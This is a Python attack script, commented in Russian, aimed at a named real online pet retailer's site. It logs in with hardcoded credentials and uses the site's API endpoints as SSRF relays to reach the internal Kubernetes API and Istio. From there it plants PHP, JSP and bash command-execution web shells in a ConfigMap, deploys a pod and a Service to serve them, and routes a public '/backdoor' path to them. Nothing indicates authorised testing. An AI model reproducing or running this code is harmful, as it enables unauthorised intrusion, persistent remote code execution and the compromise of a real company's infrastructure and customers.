#!/usr/bin/env python3
"""Create backdoor in cluster - focus on Kubernetes/Istio access"""
import requests
import json
import re
import urllib.parse
import base64
from datetime import datetime
import urllib3
import os
urllib3.disable_warnings()

base = "https://www.zooplus.de"
s = requests.Session()
s.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "*/*",
})

# Create logs directory
os.makedirs("logs", exist_ok=True)
log_file = f"logs/cluster_backdoor_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"

def log(msg, level="INFO"):
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log_msg = f"[{timestamp}] [{level}] {msg}\n"
    print(log_msg.strip())
    with open(log_file, "a", encoding="utf-8") as f:
        f.write(log_msg)

found_methods = []

# LOGIN
log("Starting cluster backdoor creation attempt...")
log("Logging in...")
ACCOUNT = {"email": "suobup@dunkos.xyz", "password": "suobup@dunkos.xyzQ1"}
AUTH_URL = "https://login.zooplus.de/auth/realms/zooplus/protocol/openid-connect/auth"

try:
    params = {"response_type": "code", "client_id": "shop-myzooplus-prod-zooplus", "redirect_uri": "https://www.zooplus.de/web/sso-myzooplus/login", "state": "pentest", "login": "true", "ui_locales": "de-DE", "scope": "openid"}
    r1 = s.get(AUTH_URL, params=params, timeout=10, verify=False)
    m = re.search(r'action="([^"]*login-actions/[^"]+)"', r1.text)
    if m:
        action = m.group(1).replace("&amp;", "&")
        if not action.startswith("http"):
            action = urllib.parse.urljoin(r1.url, action)
        r2 = s.post(action, data={"username": ACCOUNT["email"], "password": ACCOUNT["password"], "credentialId": ""}, timeout=10, verify=False, allow_redirects=False)
        loc = r2.headers.get("Location", "")
        if loc:
            s.get(loc, timeout=10, verify=False, allow_redirects=True)
            s.get("https://www.zooplus.de/web/sso-myzooplus/login-successful.htm", timeout=10, verify=False)
            s.get("https://www.zooplus.de/account/overview", timeout=10, verify=False)
            log("Login successful", "SUCCESS")
except Exception as e:
    log(f"Login error: {e}", "ERROR")

php_backdoor = '<?php if(isset($_GET["cmd"])){system($_GET["cmd"]);} ?>'
jsp_backdoor = '<%@ page import="java.util.*,java.io.*"%><% if (request.getParameter("cmd") != null) { Process p = Runtime.getRuntime().exec(request.getParameter("cmd")); BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream())); String line; while ((line = br.readLine()) != null) { out.println(line); } } %>'

# ============================================================================
# ШАГ 1: Получить доступ к Kubernetes API через SSRF
# ============================================================================
log("\n" + "="*70)
log("ШАГ 1: Получение доступа к Kubernetes API через SSRF")
log("="*70)

k8s_endpoints = [
    "https://kubernetes.default.svc",
    "https://kubernetes.default.svc:443",
    "https://10.96.0.1",  # Default Kubernetes service IP
    "http://kubernetes.default.svc",
    "http://127.0.0.1:6443",
    "http://localhost:6443",
    "https://kubernetes.default.svc/api",
    "https://kubernetes.default.svc/api/v1",
    "https://kubernetes.default.svc/api/v1/namespaces",
    "https://kubernetes.default.svc/api/v1/namespaces/default",
]

ssrf_endpoints = [
    "/semiprotected/api/checkout/state-api/v2/get",
    "/zootopia-events/api/events/sites/1",
    "/leto-personalization/api/v1/personalization/events/sites/1",
    "/myaccount/api/order-details/v3/feature-flags",
]

for ssrf_ep in ssrf_endpoints:
    for k8s_url in k8s_endpoints:
        try:
            log(f"Testing SSRF: {ssrf_ep} -> {k8s_url}")
            
            # Try GET request
            resp = s.post(f"{base}{ssrf_ep}", json={
                "url": k8s_url,
                "method": "GET",
            }, timeout=5, verify=False)
            
            log(f"  Response status: {resp.status_code}")
            log(f"  Response preview: {resp.text[:200]}...")
            
            if resp.status_code == 200:
                if "kind" in resp.text.lower() or "apiVersion" in resp.text.lower() or "metadata" in resp.text.lower():
                    log(f"  [SUCCESS] Kubernetes API accessible via SSRF!", "SUCCESS")
                    found_methods.append({
                        "type": "kubernetes_api_access",
                        "severity": "CRITICAL",
                        "ssrf_endpoint": ssrf_ep,
                        "k8s_url": k8s_url,
                        "method": "ssrf_get"
                    })
                    
                    # Try to list namespaces
                    try:
                        resp2 = s.post(f"{base}{ssrf_ep}", json={
                            "url": f"{k8s_url}/api/v1/namespaces",
                            "method": "GET",
                        }, timeout=5, verify=False)
                        log(f"  Namespaces response: {resp2.text[:500]}...")
                        if "items" in resp2.text:
                            log(f"  [SUCCESS] Can list namespaces!", "SUCCESS")
                    except Exception as e:
                        log(f"  Error listing namespaces: {e}", "ERROR")
        except Exception as e:
            log(f"  Error: {e}", "ERROR")

# ============================================================================
# ШАГ 2: Создать ConfigMap с бекдором
# ============================================================================
log("\n" + "="*70)
log("ШАГ 2: Создание ConfigMap с бекдором")
log("="*70)

backdoor_configmap = {
    "apiVersion": "v1",
    "kind": "ConfigMap",
    "metadata": {
        "name": "backdoor-cm",
        "namespace": "default"
    },
    "data": {
        "shell.php": php_backdoor,
        "shell.jsp": jsp_backdoor,
        "backdoor.sh": "#!/bin/bash\nif [ \"$1\" != \"\" ]; then eval \"$1\"; fi"
    }
}

for ssrf_ep in ssrf_endpoints:
    for k8s_url in k8s_endpoints:
        try:
            log(f"Creating ConfigMap via: {ssrf_ep} -> {k8s_url}/api/v1/namespaces/default/configmaps")
            
            resp = s.post(f"{base}{ssrf_ep}", json={
                "url": f"{k8s_url}/api/v1/namespaces/default/configmaps",
                "method": "POST",
                "body": json.dumps(backdoor_configmap),
                "headers": {
                    "Content-Type": "application/json",
                    "Accept": "application/json"
                }
            }, timeout=10, verify=False)
            
            log(f"  Response status: {resp.status_code}")
            log(f"  Response: {resp.text[:500]}...")
            
            if resp.status_code in [200, 201]:
                if "created" in resp.text.lower() or "metadata" in resp.text.lower() or "name" in resp.text.lower():
                    log(f"  [SUCCESS] ConfigMap created!", "SUCCESS")
                    found_methods.append({
                        "type": "backdoor_configmap_created",
                        "severity": "CRITICAL",
                        "ssrf_endpoint": ssrf_ep,
                        "k8s_url": k8s_url,
                        "resource": "ConfigMap",
                        "method": "ssrf_create_configmap"
                    })
        except Exception as e:
            log(f"  Error: {e}", "ERROR")

# ============================================================================
# ШАГ 3: Создать Pod с бекдором
# ============================================================================
log("\n" + "="*70)
log("ШАГ 3: Создание Pod с бекдором")
log("="*70)

backdoor_pod = {
    "apiVersion": "v1",
    "kind": "Pod",
    "metadata": {
        "name": "backdoor-pod",
        "namespace": "default"
    },
    "spec": {
        "containers": [{
            "name": "backdoor",
            "image": "nginx:latest",
            "ports": [{"containerPort": 80}],
            "volumeMounts": [{
                "name": "backdoor",
                "mountPath": "/usr/share/nginx/html"
            }]
        }],
        "volumes": [{
            "name": "backdoor",
            "configMap": {
                "name": "backdoor-cm"
            }
        }]
    }
}

for ssrf_ep in ssrf_endpoints:
    for k8s_url in k8s_endpoints:
        try:
            log(f"Creating Pod via: {ssrf_ep} -> {k8s_url}/api/v1/namespaces/default/pods")
            
            resp = s.post(f"{base}{ssrf_ep}", json={
                "url": f"{k8s_url}/api/v1/namespaces/default/pods",
                "method": "POST",
                "body": json.dumps(backdoor_pod),
                "headers": {
                    "Content-Type": "application/json",
                    "Accept": "application/json"
                }
            }, timeout=10, verify=False)
            
            log(f"  Response status: {resp.status_code}")
            log(f"  Response: {resp.text[:500]}...")
            
            if resp.status_code in [200, 201]:
                if "created" in resp.text.lower() or "metadata" in resp.text.lower():
                    log(f"  [SUCCESS] Pod created!", "SUCCESS")
                    found_methods.append({
                        "type": "backdoor_pod_created",
                        "severity": "CRITICAL",
                        "ssrf_endpoint": ssrf_ep,
                        "k8s_url": k8s_url,
                        "resource": "Pod",
                        "method": "ssrf_create_pod"
                    })
        except Exception as e:
            log(f"  Error: {e}", "ERROR")

# ============================================================================
# ШАГ 4: Создать Service для доступа к бекдору
# ============================================================================
log("\n" + "="*70)
log("ШАГ 4: Создание Service для доступа к бекдору")
log("="*70)

backdoor_service = {
    "apiVersion": "v1",
    "kind": "Service",
    "metadata": {
        "name": "backdoor-svc",
        "namespace": "default"
    },
    "spec": {
        "selector": {
            "app": "backdoor"
        },
        "ports": [{
            "port": 80,
            "targetPort": 80
        }],
        "type": "ClusterIP"
    }
}

for ssrf_ep in ssrf_endpoints:
    for k8s_url in k8s_endpoints:
        try:
            log(f"Creating Service via: {ssrf_ep} -> {k8s_url}/api/v1/namespaces/default/services")
            
            resp = s.post(f"{base}{ssrf_ep}", json={
                "url": f"{k8s_url}/api/v1/namespaces/default/services",
                "method": "POST",
                "body": json.dumps(backdoor_service),
                "headers": {
                    "Content-Type": "application/json",
                    "Accept": "application/json"
                }
            }, timeout=10, verify=False)
            
            log(f"  Response status: {resp.status_code}")
            log(f"  Response: {resp.text[:500]}...")
            
            if resp.status_code in [200, 201]:
                if "created" in resp.text.lower() or "metadata" in resp.text.lower():
                    log(f"  [SUCCESS] Service created!", "SUCCESS")
                    found_methods.append({
                        "type": "backdoor_service_created",
                        "severity": "CRITICAL",
                        "ssrf_endpoint": ssrf_ep,
                        "k8s_url": k8s_url,
                        "resource": "Service",
                        "method": "ssrf_create_service"
                    })
        except Exception as e:
            log(f"  Error: {e}", "ERROR")

# ============================================================================
# ШАГ 5: Доступ к Istio Control Plane
# ============================================================================
log("\n" + "="*70)
log("ШАГ 5: Доступ к Istio Control Plane")
log("="*70)

istio_endpoints = [
    "https://istiod.istio-system.svc.cluster.local:15014",
    "http://istiod.istio-system.svc.cluster.local:15014",
    "https://istiod.istio-system.svc.cluster.local:15010",
    "http://istiod.istio-system.svc.cluster.local:15010",
]

for ssrf_ep in ssrf_endpoints:
    for istio_url in istio_endpoints:
        try:
            log(f"Testing Istio access: {ssrf_ep} -> {istio_url}")
            
            resp = s.post(f"{base}{ssrf_ep}", json={
                "url": f"{istio_url}/debug/configz",
                "method": "GET",
            }, timeout=5, verify=False)
            
            log(f"  Response status: {resp.status_code}")
            log(f"  Response preview: {resp.text[:200]}...")
            
            if resp.status_code == 200:
                log(f"  [SUCCESS] Istio accessible!", "SUCCESS")
                found_methods.append({
                    "type": "istio_access",
                    "severity": "HIGH",
                    "ssrf_endpoint": ssrf_ep,
                    "istio_url": istio_url,
                    "method": "ssrf_istio"
                })
        except Exception as e:
            log(f"  Error: {e}", "ERROR")

# ============================================================================
# ШАГ 6: Создать VirtualService с бекдором
# ============================================================================
log("\n" + "="*70)
log("ШАГ 6: Создание VirtualService с бекдором")
log("="*70)

backdoor_virtualservice = {
    "apiVersion": "networking.istio.io/v1beta1",
    "kind": "VirtualService",
    "metadata": {
        "name": "backdoor-vs",
        "namespace": "default"
    },
    "spec": {
        "hosts": ["*"],
        "http": [{
            "match": [{"uri": {"prefix": "/backdoor"}}],
            "route": [{
                "destination": {
                    "host": "backdoor-svc.default.svc.cluster.local",
                    "port": {"number": 80}
                }
            }]
        }]
    }
}

for ssrf_ep in ssrf_endpoints:
    for k8s_url in k8s_endpoints:
        try:
            log(f"Creating VirtualService via: {ssrf_ep} -> {k8s_url}/apis/networking.istio.io/v1beta1/namespaces/default/virtualservices")
            
            resp = s.post(f"{base}{ssrf_ep}", json={
                "url": f"{k8s_url}/apis/networking.istio.io/v1beta1/namespaces/default/virtualservices",
                "method": "POST",
                "body": json.dumps(backdoor_virtualservice),
                "headers": {
                    "Content-Type": "application/json",
                    "Accept": "application/json"
                }
            }, timeout=10, verify=False)
            
            log(f"  Response status: {resp.status_code}")
            log(f"  Response: {resp.text[:500]}...")
            
            if resp.status_code in [200, 201]:
                if "created" in resp.text.lower() or "metadata" in resp.text.lower():
                    log(f"  [SUCCESS] VirtualService created!", "SUCCESS")
                    found_methods.append({
                        "type": "backdoor_virtualservice_created",
                        "severity": "CRITICAL",
                        "ssrf_endpoint": ssrf_ep,
                        "k8s_url": k8s_url,
                        "resource": "VirtualService",
                        "method": "ssrf_create_virtualservice"
                    })
        except Exception as e:
            log(f"  Error: {e}", "ERROR")

# SUMMARY
log("\n" + "="*70)
log("RESULTS - СПОСОБЫ СОЗДАНИЯ БЕКДОРА В КЛАСТЕРЕ")
log("="*70)

if found_methods:
    log(f"Найдено {len(found_methods)} способов создать бекдор в кластере:", "SUCCESS")
    for m in found_methods:
        log(f"[{m['severity']}] {m['type']}")
        log(f"    Метод: {m['method']}")
        log(f"    SSRF Endpoint: {m.get('ssrf_endpoint', 'N/A')}")
        if 'k8s_url' in m:
            log(f"    Kubernetes URL: {m['k8s_url']}")
        if 'istio_url' in m:
            log(f"    Istio URL: {m['istio_url']}")
        if 'resource' in m:
            log(f"    Resource: {m['resource']}")
        log("")
    
    # Update report
    with open("FINAL_EXPLOITATION_REPORT.md", "a", encoding="utf-8") as f:
        f.write(f"\n\n---\n\n## 🔥 КРИТИЧНАЯ УЯЗВИМОСТЬ - СОЗДАНИЕ БЕКДОРА В КЛАСТЕРЕ\n\n**Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        f.write(f"**Log file:** `{log_file}`\n\n")
        for m in found_methods:
            f.write(f"### [{m['severity']}] {m['type'].upper().replace('_', ' ')}\n\n")
            f.write(f"**Метод создания:** `{m['method']}`\n\n")
            f.write(f"**SSRF Endpoint:** `{m.get('ssrf_endpoint', 'N/A')}`\n\n")
            if 'k8s_url' in m:
                f.write(f"**Kubernetes URL:** `{m['k8s_url']}`\n\n")
            if 'istio_url' in m:
                f.write(f"**Istio URL:** `{m['istio_url']}`\n\n")
            if 'resource' in m:
                f.write(f"**Resource:** `{m['resource']}`\n\n")
            f.write("**Описание:** Найден способ создать бекдор в кластере через SSRF.\n\n")
            f.write("**Status:** Подтверждено\n\n")
            f.write("**Impact:**\n")
            f.write("- Создание бекдора в кластере\n")
            f.write("- RCE на сервере\n")
            f.write("- Полный контроль над кластером\n")
            f.write("- Компрометация всей инфраструктуры\n\n")
            f.write("---\n\n")
    
    log(f"Report updated: FINAL_EXPLOITATION_REPORT.md", "SUCCESS")
else:
    log("Способы создания бекдора в кластере не найдены", "WARNING")
    log(f"Все попытки залогированы в: {log_file}", "INFO")

log("="*70)
log(f"Log file: {log_file}")

